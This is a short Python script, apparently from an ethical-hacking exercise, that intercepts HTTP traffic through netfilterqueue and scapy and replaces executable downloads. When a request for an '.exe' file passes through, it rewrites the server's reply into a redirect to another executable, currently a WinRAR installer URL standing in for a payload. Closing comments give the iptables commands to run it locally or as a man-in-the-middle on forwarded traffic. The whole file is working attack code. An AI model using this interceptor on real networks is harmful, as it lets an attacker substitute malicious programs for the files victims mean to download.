#!/usr/bin/env python
#only works with python 2 :'(
import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if "exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-610.exe\n\n"

                packet.set_payload(bytes(scapy_packet))
    packet.accept()

try:
    while True:
        # This makes an object which uses the netfilter library to access the queue made by the "iptables" cmd
        queue = netfilterqueue.NetfilterQueue()
        # This binds the queue that the iptables make with the "queue" variable so that the program can apply another
        # function on it
        queue.bind(0, process_packet)
        # This runs the queue command
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Ending process")

#iptables --flush
#For local
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0

#For Remote
#iptables -I FORWARD -j NFQUEUE --queue-num 0

#needed to not break internet
# echo 1 > /proc/sys/net/ipv4/ip_forward